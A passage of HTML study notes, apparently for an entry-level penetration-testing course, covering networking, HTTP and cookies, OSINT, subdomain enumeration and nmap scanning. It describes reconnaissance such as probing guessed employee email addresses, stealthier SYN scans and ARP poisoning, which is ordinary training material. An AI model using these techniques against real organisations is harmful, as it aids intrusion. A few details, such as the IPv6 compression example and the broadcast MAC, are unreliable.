class="mord">1</span><span class="mord">1</span></span></span></span></li>
+</ul>
+</li>
+<li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>63</mn><mi mathvariant="normal">/</mi><mn>16</mn><mo>=</mo><mn>3</mn><mo separator="true">,</mo><mn>9375</mn></mrow><annotation encoding="application/x-tex">63/16 = 3,9375</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">6</span><span class="mord">3</span><span class="mord">/</span><span class="mord">1</span><span class="mord">6</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">9</span><span class="mord">3</span><span class="mord">7</span><span class="mord">5</span></span></span></span>
+<ul>
+<li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>0</mn><mo separator="true">,</mo><mn>9375</mn><mo>∗</mo><mn>16</mn><mo>=</mo><mn>15</mn></mrow><annotation encoding="application/x-tex">0,9375*16 = 15</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">9</span><span class="mord">3</span><span class="mord">7</span><span class="mord">5</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">6</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">5</span></span></span></span></li>
+</ul>
+</li>
+<li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>3</mn><mi mathvariant="normal">/</mi><mn>16</mn><mo>=</mo><mn>0</mn><mo separator="true">,</mo><mn>1875</mn></mrow><annotation encoding="application/x-tex">3/16 = 0,1875</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">3</span><span class="mord">/</span><span class="mord">1</span><span class="mord">6</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">8</span><span class="mord">7</span><span class="mord">5</span></span></span></span>
+<ul>
+<li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>0</mn><mo separator="true">,</mo><mn>1875</mn><mo>∗</mo><mn>16</mn><mo>=</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">0,1875 * 16 = 3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">8</span><span class="mord">7</span><span class="mord">5</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">6</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span></span></span></span></li>
+</ul>
+</li>
+<li><strong>=0x3FB</strong></li>
+</ul>
+</li>
+<li>Use converters online for this instead</li>
+</ul>
+<h2 id="2-networking">2 Networking</h2>
+<h3 id="21-protocols">2.1 Protocols</h3>
+<ul>
+<li>Machines talk to each other by means of protocols</li>
+</ul>
+<h4 id="211-packets">2.1.1 Packets</h4>
+<ul>
+<li>
+<p>Carries information between networked computers</p>
+</li>
+<li>
+<p>Consists of a header and a payload</p>
+</li>
+<li>
+<p><strong>Header</strong></p>
+<ul>
+<li>Has protocol-specific structure that makes sure the host can correctly interperet the payload</li>
+</ul>
+</li>
+<li>
+<p><strong>Payload</strong></p>
+<ul>
+<li>The actual information of the package</li>
+</ul>
+</li>
+<li>
+<p><strong>The IP Header</strong></p>
+<ul>
+<li>Atleast 160 bits long</li>
+<li>First four bits are IP version(4 or 6)</li>
+<li>32 bits ad position 96 represent source address</li>
+<li>Following 4 bytes represent destination address</li>
+</ul>
+</li>
+</ul>
+<h4 id="212-protocol-layers">2.1.2 Protocol Layers</h4>
+<ul>
+<li>
+<p><strong>ISO layers:</strong></p>
+<ol>
+<li>Application</li>
+<li>Presentation</li>
+<li>Session</li>
+<li>Transport</li>
+<li>Network</li>
+<li>Data Link</li>
+<li>Physical</li>
+</ol>
+</li>
+<li>
+<p>Each layer encapsulates a package with its own header</p>
+</li>
+<li>
+<p>The recieving host does the same in reverse</p>
+</li>
+</ul>
+<h3 id="22-ip">2.2 IP</h3>
+<ul>
+<li>
+<p>TCP/IP</p>
+</li>
+<li>
+<p>Delivering datagrams</p>
+</li>
+<li>
+<p>Each host has a unique address</p>
+</li>
+<li>
+<p>Reserved IP's:</p>
+<ul>
+<li>0.0.0.0 - 0.255.255.255 is This network</li>
+<li>127.0.0.0 - 127.255.255.255 is Local host</li>
+<li>192.168.0.0 - 192.168.255.255 us reserved for private networks</li>
+</ul>
+</li>
+</ul>
+<h4 id="221-ipmask">2.2.1 IP/Mask</h4>
+<ul>
+<li>Identifies a network part and host part of an IP address</li>
+<li>Perform bitwise AND operation between the netmask and the IP address</li>
+<li><strong>Network Prefix:</strong>
+<ul>
+<li>192.168.32.0/255.255.224.0</li>
+</ul>
+</li>
+<li><strong>CIDR Notation</strong>
+<ul>
+<li>192.168.32.0/19</li>
+</ul>
+</li>
+<li>Subnet calculators</li>
+</ul>
+<h4 id="223-ipv6">2.2.3 IPv6</h4>
+<ul>
+<li>
+<p>IPv6 has 128 bit addresses compared to IPv4's 32 bit</p>
+</li>
+<li>
+<p>Consists of 16-bit hexadecimal numbers seperated by a &quot;:&quot;</p>
+<ul>
+<li>Case insensitive</li>
+<li>Can be skipped if zero occur</li>
+</ul>
+</li>
+<li>
+<p>Several representations:</p>
+<ol>
+<li><strong>Regular form:</strong> 1080:0:FF:0:8:800:200C:417A</li>
+<li><strong>Compressed form:</strong> FF01:0:0:0:0:0:0:43 --) FF91::43</li>
+</ol>
+</li>
+<li>
+<p>Also has reserverd addresses</p>
+</li>
+<li>
+<p>Can be split in half into network part and a device part</p>
+<ul>
+<li>First 64 bits ends with a 16-bits space that can only be used for specifying a subnet</li>
+</ul>
+</li>
+<li>
+<p><strong>Scope and address types of IPv6</strong></p>
+<ul>
+<li>Global Unicast Address
+<ul>
+<li>Scope: Internet-Routed on Internet</li>
+</ul>
+</li>
+<li>Unique Local
+<ul>
+<li>Scope: Internal network or VPN, internally routable but not routed on Internet</li>
+</ul>
+</li>
+<li>Link Local
+<ul>
+<li>Scope: Network link-Not routed internally or externally</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Translating IPv6 to binary</p>
+<ul>
+<li>One 4-digit hex work represents 16 binary digits</li>
+<li>Bin 0000000000000000 = Hex 0000</li>
+<li>Bin 1111111111111111 = Hex FFFF</li>
+<li>Bin 1101010011011011 = Hex D4DB</li>
+</ul>
+</li>
+<li>
+<p>IPv6 addresses has a dedicated subnetting portion</p>
+<ul>
+<li>First 48 bits are global addressing</li>
+<li>The 16 next are defining subnets</li>
+<li>The last 64 bits are for device(interface) ID's</li>
+</ul>
+</li>
+<li>
+<p>Prefixes</p>
+<ul>
+<li>In IPv6, prefixes instead of subnet blocks</li>
+<li>2001:1111:1234:1234::/64
+<ul>
+<li>The number after slaggs is the number of bits that is used for a prefix</li>
+<li>Everything else behind it can be used for hosts of the subnet</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="23-routing">2.3 Routing</h3>
+<ul>
+<li>
+<p>Routers are connected to different networks at the same time forwaring datagrams from one network to another</p>
+</li>
+<li>
+<p>Forwarding policy based on routing protocols</p>
+</li>
+<li>
+<p>Routers use routing tables to find the right forwarding policy</p>
+</li>
+<li>
+<p>Routes to network matching the address of the packet, if no matching entry in table, send to default 0.0.0.0</p>
+</li>
+<li>
+<p>If two paths have the same number of hops, routing metrics ensures the fastest is selected</p>
+</li>
+<li>
+<p>Every host also stores their own routing table</p>
+</li>
+</ul>
+<h3 id="24-link-layer-devices-and-protocols">2.4 Link Layer Devices and Protocols</h3>
+<ul>
+<li>
+<p>Link layer is the lowest stack of TCP/IP stack</p>
+</li>
+<li>
+<p>Packet forwarding also occurs her</p>
+</li>
+<li>
+<p>Hubs and switches are network devices that forward frames on a local network wit link layer network addresses: <strong>MAC addresses</strong></p>
+<ul>
+<li>Mac addresses uniquely identify network cards at layer 2</li>
+<li>Media Access Control</li>
+<li>Also known as the physical address</li>
+<li>48 bits long expressed in hex</li>
+<li>Each host on a network has both an IP address and a MAC address</li>
+</ul>
+</li>
+<li>
+<p>Sending a packet from one network to another:</p>
+<ul>
+<li>The sender creates a packet with:
+<ol>
+<li>The destination IP address of the reciever in the header of the datagram</li>
+<li>The destination MAC address of the router in the link layer header of the frame</li>
+<li>The source IP address of the sender</li>
+<li>The source MAC address of the sender</li>
+</ol>
+</li>
+<li>The router then takes the packet and forward it to the recievers network, rewriting the packet's MAC addresses
+<ul>
+<li>The destination MAC address will be the recievers address</li>
+<li>The source MAC address will be the router's</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Broadcast MAC address</p>
+<ul>
+<li>A frame with this address is delivered to all the hosts in the local network</li>
+</ul>
+</li>
+</ul>
+<h4 id="241-switches">2.4.1 Switches</h4>
+<ul>
+<li>Switches works with mac adresses</li>
+<li>Multiple interfaces</li>
+<li>Forwarding table</li>
+<li>Learns of new hosts dynamically by inspecting packet headers</li>
+</ul>
+<h4 id="242-forwarding-tables">2.4.2 Forwarding tables</h4>
+<ul>
+<li>Content addressable memory table(CAM)</li>
+<li>Contains:
+<ul>
+<li>MAC addresses</li>
+<li>Interface tied to MAC addresses and a time to live(TTL)</li>
+</ul>
+</li>
+<li>Stored in the devices RAM, and is constantly refreshed</li>
+<li>TTL is how long an entry will stay in the table</li>
+<li>TTL is important because CAM's have finite sizes</li>
+<li>Source MAC addresses are compared in the to the entries in the CAM table for all packets
+<ul>
+<li>If source is not in the table, the switch will add a new MAC interface binding in the table</li>
+<li>If it exists in the table, TTL is updated</li>
+<li>Updates if MAC is bound to another interface</li>
+</ul>
+</li>
+</ul>
+<h4 id="243-forwarding">2.4.3 Forwarding</h4>
+<ul>
+<li>To forward a packet:
+<ol>
+<li>Switch reads destination MAC address of frame</li>
+<li>Looks in the CAM table</li>
+<li>Forwards to corresponding interface</li>
+<li>If no entry with that MAC address, the switch forwards the frame to all interfaces</li>
+</ol>
+</li>
+</ul>
+<h4 id="244-address-resolution-protocolarp">2.4.4 Address Resolution Protocol(ARP)</h4>
+<ul>
+<li>
+<p>Makes hosts able to build correct IP address - MAC address bindings</p>
+</li>
+<li>
+<p>Host A wants to send traffic to B, but only knows the IP address of B:</p>
+<ol>
+<li>A builds an ARP request containing the IP of B and FF:FF:FF:FF as destination MAC address. This makes the switch forward it to all hosts</li>
+<li>Every host recieves the requests</li>
+<li>B replies with an ARP reply to A, telling it's MAC</li>
+<li>A then saves the the IP-MAC in its ARP cache</li>
+</ol>
+</li>
+</ul>
+<h4 id="245-hubs">2.4.5 Hubs</h4>
+<ul>
+<li>Just repeaters forwarding packets by repeating the electrical signal it recieves</li>
+</ul>
+<h3 id="25-tpcudp">2.5 TPC/UDP</h3>
+<ul>
+<li>
+<p>Transmission control protocol</p>
+</li>
+<li>
+<p>User datagram protcol</p>
+</li>
+<li>
+<p>IP protocol suite using TCP is called TCP/IP</p>
+</li>
+<li>
+<p>Characteristics of TCP and UDP:</p>
+<ul>
+<li>TCP:
+<ul>
+<li>Lower throughput</li>
+<li>Connection oriented</li>
+<li>Guarantees delievry</li>
+</ul>
+</li>
+<li>UDP:
+<ul>
+<li>Better throughput</li>
+<li>Connectionless</li>
+<li>Does not guarantee packet delivry</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="251-ports">2.5.1 Ports</h4>
+<ul>
+<li>Used to identify single network process on a machine</li>
+<li><strong>IP</strong> : <strong>Port</strong>
+<ul>
+<li>0.0.0.0:80</li>
+</ul>
+</li>
+</ul>
+<h4 id="252-tcp-and-udp-headers">2.5.2 TCP and UDP Headers</h4>
+<ul>
+<li>Two fields
+<ul>
+<li>Source</li>
+<li>Destination ports</li>
+</ul>
+</li>
+<li>Tells the server or client what port to use</li>
+</ul>
+<h4 id="253-tcp-three-way-handshake">2.5.3 TCP Three Way Handshake</h4>
+<ul>
+<li>
+<p>Header fiels involved:</p>
+<ul>
+<li>Sequence number</li>
+<li>Acknowledgment number</li>
+<li>SYN and ACK flags</li>
+</ul>
+</li>
+<li>
+<p>Procedure:</p>
+<ol>
+<li>Client sends TCP packet with SYN flag enabled and a random sequence number</li>
+<li>Server responds with SYN and ACK flags set, and a random sequence number
+<ul>
+<li>ACK number is always an increment of recieved SYN</li>
+</ul>
+</li>
+<li>Client completes synchronization by sending ACK</li>
+</ol>
+</li>
+</ul>
+<h3 id="26-firewalls-and-network-defence">2.6 Firewalls and Network Defence</h3>
+<h4 id="261-firewalls">2.6.1 Firewalls</h4>
+<ul>
+<li>
+<p>Software filtering packets</p>
+</li>
+<li>
+<p>Access control on different layers of the OSI model</p>
+</li>
+<li>
+<p>Filters according to rules:</p>
+<ul>
+<li>Source IP</li>
+<li>Destination IP</li>
+<li>Protocol</li>
+<li>Source port</li>
+<li>Destination port</li>
+<li>etc..</li>
+</ul>
+</li>
+<li>
+<p>Packet filters inspects headers to determine what to do:</p>
+<ul>
+<li>Allow</li>
+<li>Drop - No notifying to server</li>
+<li>Deny - Notifying server</li>
+</ul>
+</li>
+<li>
+<p><strong>Problem</strong>: Headers give no information on content data of packet</p>
+</li>
+<li>
+<p>Attack example:</p>
+<ul>
+<li>Company hosts a web server</li>
+<li>Firewall allows all incoming traffic from internet and direct it to port 80</li>
+<li>Application exploits go through because firewall can not see the difference between web browsing and web exploit
+//TODO</li>
+</ul>
+</li>
+</ul>
+<h3 id="27-dns">2.7 DNS</h3>
+<ul>
+<li>
+<p>Domain Name System</p>
+</li>
+<li>
+<p>Application layer protocol</p>
+</li>
+<li>
+<p>Converts human-readable names to IP addresses</p>
+</li>
+<li>
+<p>A DNS name can be broken down into:</p>
+<ul>
+<li>Top level domain(TLD)</li>
+<li>Domain name</li>
+<li>Subdomain name</li>
+<li>Host name</li>
+</ul>
+</li>
+<li>
+<p>Name resolution performed by resolvers</p>
+<ul>
+<li>Servers contacting top level domain and follows the hiarchy to resolve the name of the host</li>
+<li>ISP or publicly available</li>
+</ul>
+</li>
+<li>
+<p>OS must contact a resolver to break down DNS into IP address</p>
+</li>
+<li>
+<p>DNS resolution algorithm:</p>
+<ol>
+<li>Resolver contacts root name servers</li>
+<li>Then asks TLD name server what the authoritive name server is that can give information about the domain it seeks</li>
+<li>If there are more subdomains, step 2 is performed again on the authorotive DNS server for every subdomain</li>
+<li>Finally the resolver asks for the name resolution for the host part</li>
+</ol>
+</li>
+<li>
+<p>IP addresses of the root servers are hardcoded in to the configuration of the resolver, and needs to be updated to work</p>
+</li>
+<li>
+<p>DNS can also reverse an IP address to a DNS name</p>
+</li>
+</ul>
+<h3 id="28-wireshark">2.8 Wireshark</h3>
+<h4 id="nic-promiscuous-mode">NIC Promiscuous Mode</h4>
+<ul>
+<li>Network interface cards</li>
+<li>A NIC will accept and process any packet it recieves</li>
+<li>To sniff other ethernet traffic, ARP poisoning or Mac flooding must be performed</li>
+<li><strong>Capture filters</strong> downsizes the amount of traffic gathered</li>
+<li><strong>Display filters</strong> allows granular filters to every field of the captured packets</li>
+</ul>
+<h2 id="3-web-applications">3 Web Applications</h2>
+<h3 id="31-http">3.1 HTTP</h3>
+<ul>
+<li>
+<p>Hyper text transfer protocol</p>
+</li>
+<li>
+<p>Transfers web pages and web application data</p>
+</li>
+<li>
+<p>Works on top of the TCP protocol</p>
+</li>
+<li>
+<p>HTTP message format:</p>
+<ul>
+<li>Headers\r\n</li>
+<li>\n\n</li>
+<li>Message Body\r\n</li>
+</ul>
+</li>
+<li>
+<p>HTTP Header fields:</p>
+<ul>
+<li><strong>Request method</strong>
+<ul>
+<li>Type of request(GET, PUT, TRACE, HEAD, POST, etc)</li>
+</ul>
+</li>
+<li><strong>Host</strong>
+<ul>
+<li>Internet hostname and port number</li>
+</ul>
+</li>
+<li><strong>User-Agent</strong>
+<ul>
+<li>Client software and OS issuing request</li>
+</ul>
+</li>
+<li><strong>Accept</strong>
+<ul>
+<li>What  document type it is expecting in response</li>
+</ul>
+</li>
+<li><strong>Accept Language</strong>
+<ul>
+<li>Specific human language in response</li>
+</ul>
+</li>
+<li><strong>Accept Encoding</strong>
+<ul>
+<li>Restricts content encoding</li>
+</ul>
+</li>
+<li><strong>Connection</strong>
+<ul>
+<li>Desired properties for current connection</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Server sends response after client request:</p>
+<ul>
+<li><strong>Status Line</strong>
+<ul>
+<li>Status codes</li>
+</ul>
+</li>
+<li><strong>Date</strong>
+<ul>
+<li>Date and time request message was originated</li>
+</ul>
+</li>
+<li><strong>Cache-Control</strong>
+<ul>
+<li>Tells the client about cached content</li>
+</ul>
+</li>
+<li><strong>Content-Type</strong>
+<ul>
+<li>Tells the client how to intereperet the message</li>
+</ul>
+</li>
+<li><strong>Content-Encoding</strong>
+<ul>
+<li>Extends content type</li>
+</ul>
+</li>
+<li><strong>Server</strong>
+<ul>
+<li>Contains header of server who generated response</li>
+</ul>
+</li>
+<li><strong>Content-Length</strong>
+<ul>
+<li>Length of content in bytes</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="32-https">3.2 HTTPS</h3>
+<ul>
+<li>
+<p>HTTP Secure</p>
+</li>
+<li>
+<p>HTTPS over TLS</p>
+</li>
+<li>
+<p>Encryption layer</p>
+<ul>
+<li>Cannot sniff application layer communication</li>
+<li>Cannot alter application layer data</li>
+<li>Server and client can authenticate eachother</li>
+</ul>
+</li>
+<li>
+<p>An adjacent network user will not be able to recognize:</p>
+<ul>
+<li>Request headers, body and domain</li>
+<li>Response headers, body</li>
+</ul>
+</li>
+<li>
+<p>He coulf be able to recognize:</p>
+<ul>
+<li>Target IP</li>
+<li>Target Port</li>
+<li>DNS</li>
+</ul>
+</li>
+<li>
+<p>Does not protect against web application flaws!</p>
+</li>
+</ul>
+<h3 id="33-http-cookies">3.3 HTTP Cookies</h3>
+<ul>
+<li>Textual information stored in the servers cookie jar</li>
+<li>A cookie contains the following attributes:
+<ul>
+<li>The actual content
+<ul>
+<li>ID=value</li>
+</ul>
+</li>
+<li>An expiration date
+<ul>
+<li>expires=.......</li>
+</ul>
+</li>
+<li>A path
+<ul>
+<li>path=/...../..</li>
+</ul>
+</li>
+<li>The domain
+<ul>
+<li><a href="http://domain=.example.com">domain=.example.com</a></li>
+</ul>
+</li>
+<li>Optional flags:
+<ul>
+<li>Http only flag</li>
+<li>Secure flag</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="331-cookie-domain">3.3.1 Cookie Domain</h4>
+<ul>
+<li>
+<p>Cookies are sent only to their valid domain/path if they are not expired and according to their flags</p>
+</li>
+<li>
+<p>The domain field sets the scope of the cookie, browser only sends cookie if it is for the right domain</p>
+</li>
+<li>
+<p>When a cookie has the domain attribute set to:</p>
+<ul>
+<li><a href="http://domain=example.com">domain=example.com</a> or .example.com, the browser will send the cookie to the site and whatever else subdomains within the scope</li>
+</ul>
+</li>
+<li>
+<p>If the server does not specify the domain attribute, the browser automatically set the domain of the server domain, and set the host  only domain flag</p>
+</li>
+</ul>
+<h4 id="332-cookie-expiration">3.3.2 Cookie Expiration</h4>
+<ul>
+<li>Expires is the validity timer for the cookie</li>
+<li>Browsers will not send expired cookies to servers</li>
+</ul>
+<h4 id="333-cookie-http-only-attribute">3.3.3 Cookie Http-Only Attribute</h4>
+<ul>
+<li>Prevents any other language than HTTP to read from the cookie</li>
+</ul>
+<h4 id="334-cookie-secure-attribute">3.3.4 Cookie Secure Attribute</h4>
+<ul>
+<li>Secure flag creates secure cookies only sent over HTTPS</li>
+</ul>
+<h4 id="335-cookie-protocol">3.3.5 Cookie Protocol</h4>
+<ul>
+<li>Servers sends Set-Cookie response in header field. telling the browser to install the cookie</li>
+<li>For every subsequen request the browser considers:
+<ul>
+<li>Domain</li>
+<li>Path</li>
+<li>Expiration</li>
+<li>Flags</li>
+</ul>
+</li>
+<li>If all pass, the browser will insert a cookie: header in the request</li>
+</ul>
+<h3 id="34-sessions">3.4 Sessions</h3>
+<ul>
+<li>
+<p>Server side stored variables</p>
+</li>
+<li>
+<p>Identified by an ID or Token</p>
+</li>
+<li>
+<p>Clients presents this ID for all requests, being recognized by the server</p>
+</li>
+<li>
+<p>Web servers install session ID's by using session cookies</p>
+<ul>
+<li>Single parameter referring to the session</li>
+<li>Each language has their own session parameter name</li>
+</ul>
+</li>
+<li>
+<p>Session IDs can also transmitted via GET requests</p>
+</li>
+</ul>
+<h4 id="35-same-origin-policy">3.5 Same Origin Policy</h4>
+<ul>
+<li>Prevents JavaScript code from getting or setting properties on resource coming from a different origin</li>
+<li>To determine if JavaScript can access a source, the browser uses:
+<ul>
+<li>Protocol</li>
+<li>Hostname</li>
+<li>Port</li>
+</ul>
+</li>
+<li>All must match!</li>
+<li>Only works for the actual script, HTML tags are still vulnerable</li>
+</ul>
+<h2 id="4-scripting">4 Scripting</h2>
+<h3 id="41-important-windows-commands">4.1 Important Windows Commands</h3>
+<ul>
+<li>
+<p><strong>Output redirection:</strong></p>
+<ul>
+<li>echo aaa ) output.txt</li>
+</ul>
+</li>
+<li>
+<p><strong>Execute two commands regardless of eachother:</strong></p>
+<ul>
+<li>[Command1] &amp; [Command2]</li>
+</ul>
+</li>
+<li>
+<p><strong>Execute two commands where the other executes if the other succeeds:</strong></p>
+<ul>
+<li>[Command1] &amp;&amp; [Command2]</li>
+</ul>
+</li>
+<li>
+<p><strong>To create larger command line scripts, save them as .bat with one command per line</strong></p>
+</li>
+<li>
+<p><strong>List all files in a directory:</strong></p>
+<ul>
+<li>for %i (<em>.</em>) do @echo FILE: %</li>
+</ul>
+</li>
+</ul>
+<h2 id="5-information-gathering">5 Information Gathering</h2>
+<h3 id="51-open-source-intelligence">5.1 Open-Source Intelligence</h3>
+<h4 id="511-social-networks">5.1.1 Social Networks</h4>
+<ul>
+<li>Easiest way to gather information about employees</li>
+<li>Important to select the correct social media depending on client</li>
+<li>Integration between social media profiles can help you find important information on one site, unnavailable on the other
+<ul>
+<li>Twitter and LinkedIn can be used to autheticate eachother</li>
+<li>LinkedIn displays full name along with email</li>
+</ul>
+</li>
+</ul>
+<h4 id="512-public-sites-information-gathering">5.1.2 Public Sites Information Gathering</h4>
+<ul>
+<li>
+<p><strong>CrunchBase</strong></p>
+<ul>
+<li>Information about founder, investors, employees, buyouts and acquisitions</li>
+</ul>
+</li>
+<li>
+<p><strong>Government sites</strong></p>
+</li>
+<li>
+<p><strong>Whois</strong></p>
+<ul>
+<li>Command on OSX and Linux</li>
+<li>Displays information stored in the whois database</li>
+<li>Used on internet domains</li>
+</ul>
+</li>
+</ul>
+<h4 id="513-browsing-client%c2%b4s-sites">5.1.3 Browsing Client´s Sites</h4>
+<ul>
+<li>Products</li>
+<li>Services</li>
+<li>Technologies</li>
+<li>Company culture</li>
+<li>Employees profiles</li>
+</ul>
+<h4 id="514-email-patterns">5.1.4 Email Patterns</h4>
+<ul>
+<li>
+<p>Many companies uses internal email schemas for employees</p>
+</li>
+<li>
+<p>Often:</p>
+<ul>
+<li><a href="mailto:name.surename@company.com">name.surename@company.com</a></li>
+<li><a href="mailto:surname.name@company.com">surname.name@company.com</a></li>
+</ul>
+</li>
+<li>
+<p>Some systems informs the sender if an email address does not exist</p>
+<ul>
+<li>Gather names of employees in the company</li>
+<li>Try different combinations of first- and surnames</li>
+<li>Send non suspicous mails to the different addresses and observe what the addresses return</li>
+<li>If some of the addresses return a failed mail request notification, you can disregard it, and find the actual addresses</li>
+</ul>
+</li>
+</ul>
+<h3 id="52-subdomain-enumeration">5.2 Subdomain Enumeration</h3>
+<ul>
+<li>
+<p>Enumerate to find new resources</p>
+</li>
+<li>
+<p>Widens the attack surface</p>
+</li>
+<li>
+<p>Common for companies to share the same top level domain name</p>
+<ul>
+<li>e.g <a href="http://careers.company.com">careers.company.com</a>, <a href="http://mail.company.com">mail.company.com</a></li>
+<li>May be outdated</li>
+</ul>
+</li>
+<li>
+<p>Passive subdomain enumeration</p>
+<ul>
+<li>Identifying subdomains without directly interracting with the target</li>
+<li>Interracting through open sources such as search engines</li>
+<li>Google for example may index pages that were not meant to be indexed
+<ul>
+<li>site:company.com</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong><a href="http://dnsdumpster.com">dnsdumpster.com</a></strong></p>
+</li>
+<li>
+<p><strong>sublist3r</strong></p>
+<ul>
+<li>Collects DNS data</li>
+</ul>
+</li>
+</ul>
+<h2 id="6-footprinting-and-scanning">6 Footprinting and Scanning</h2>
+<h3 id="61-mapping-networks">6.1 Mapping Networks</h3>
+<ul>
+<li>
+<p>Enumeration process to find nodes from IPs</p>
+<ul>
+<li>Who is a client and server?</li>
+</ul>
+</li>
+<li>
+<p>Ping sweeping:</p>
+<ul>
+<li>Sending echo requests(IMCP packets) to hosts to see who is alive</li>
+<li>It it replies with an echo reply packet, the host is alive</li>
+<li>Fping
+<ul>
+<li>Linux ping sweeper
+<ul>
+<li><em>Fping -a -g 10.54.12.0/24</em></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Nmap
+<ul>
+<li>*nmap [scan type] [options] [target]</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="63-nmap-ping-scan">6.3 Nmap Ping Scan</h3>
+<ul>
+<li><strong>-sn</strong>
+<ul>
+<li>Ping scan
+<ul>
+<li><em>nmap -sn 200.200.0.0/16</em></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>-il</strong>
+<ul>
+<li>Save host list to file and use as input
+<ul>
+<li><em>nmap -sn -iL hostslist.txt</em></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>-Pn</strong>
+<ul>
+<li>Skips the ping scan</li>
+<li>If you allready know the targets are alive</li>
+</ul>
+</li>
+</ul>
+<h3 id="64-nmap-os-fingerprinting">6.4 nmap OS Fingerprinting</h3>
+<ul>
+<li><strong>-O</strong>
+<ul>
+<li>OS fingerprinting</li>
+<li>Determining which OS the host is running</li>
+<li>Sends a series of specifically crafted requests to hosts and examines every bit to find OS signatures
+<ul>
+<li><em>nmap -Pn -O (target(s))</em></li>
+</ul>
+</li>
+<li>Limit to promising hosts
+<ul>
+<li><em>nmap -O --osscan-limit (targets)</em></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="65-nmap-port-scan">6.5 nmap Port Scan</h3>
+<ul>
+<li>
+<p>Discover services and daemons listening on different ports</p>
+</li>
+<li>
+<p>Determine which TCP or UDP ports are open on the target host</p>
+</li>
+<li>
+<p>When a port scanner tries to connect to an open TCP port</p>
+<ul>
+<li>The TCP three way handshake is completed</li>
+<li>This means the port is open</li>
+<li>The scanner sends a RST+ACK to close the connection</li>
+</ul>
+</li>
+<li>
+<p>When a port scanner tries to connect to a closed TCP port</p>
+<ul>
+<li>The scanner tries to complete the three way handsake by sending a SYN packet</li>
+<li>The server replies with a packet with RST-ACK packet</li>
+<li>This means the port is closed</li>
+</ul>
+</li>
+<li>
+<p>Every TCP connect gets recorded in the daemon logs</p>
+<ul>
+<li>To be more stealthy, use TCP SYN scans</li>
+<li>A well-configured IDS will still detect it</li>
+<li>Only sends a SYN packet instead of full TCP handshake</li>
+<li>If scanner recieves SYN+ACK packet, port is marked as open</li>
+</ul>
+</li>
+<li>
+<p>Common nmap scan types</p>
+<ul>
+<li><strong>-sT</strong> - TCP connect scan</li>
+<li><strong>-sS</strong> - TCPSYN scan</li>
+<li><strong>-sV</strong> - version detection scan
+<ul>
+<li>Reads the banner from the daemon on the port</li>
+</ul>
+</li>
+<li><strong>-p</strong> - Specifies port range</li>
+<li><strong>-A</strong> - Scans everything</li>
+</ul>
+</li>
+<li>
+<p>Scan targets can be specified with</p>
+<ul>
+<li>DNS names</li>
+<li>IP address lists</li>
+<li>CIDR notation</li>
+<li>Wildcards</li>
+<li>Ranges</li>
+<li>Octets lists</li>
+<li>Input files</li>
+</ul>
+</li>
+</ul>
+<h3 id="66-spotting-firewalls">6.6 Spotting Firewalls</h3>
+<ul>
+<li>
+<p>Pings could be blocked</p>
+<ul>
+<li><strong>-Pn</strong> - Skips ping scanning and treats ports as alive</li>
+</ul>
+</li>
+<li>
+<p>Some ports are almost always open on a networkl even if they appear closed</p>
+</li>
+<li>
+<p>Be aware of false positives</p>
+</li>
+<li>
